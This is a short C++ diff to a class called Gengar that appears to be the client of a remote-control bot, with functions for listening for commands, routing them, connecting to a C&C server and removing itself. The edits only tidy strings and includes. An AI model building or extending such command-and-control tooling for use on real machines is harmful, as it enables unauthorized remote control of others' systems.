@@ -1,4 +1,3 @@
-#include <iostream>
 #include "gengar.h"
 
 bool IsEqual(std::string str1, std::string str2)
@@ -24,7 +23,7 @@ void Gengar::ListenForCommand()
 			size_t delimiter_index = input.find(type_content_delimiter);
 
 			if (delimiter_index == std::string::npos)
-				m_client.Send("Invalid command.\n");
+				m_client.Send("Invalid command.");
 			else
 			{
 				std::string type = input.substr(0, delimiter_index);
@@ -57,10 +56,9 @@ void Gengar::RouteCommand(std::string& type, std::string& content)
 			m_machine.Suicide();
 	}
 	else
-		output = "Unknown command type.\n";
+		output = "Unknown command type.";
 	m_client.Send(std::move(output));
 }
-
 
 void Gengar::ConnectToCnc()
 {
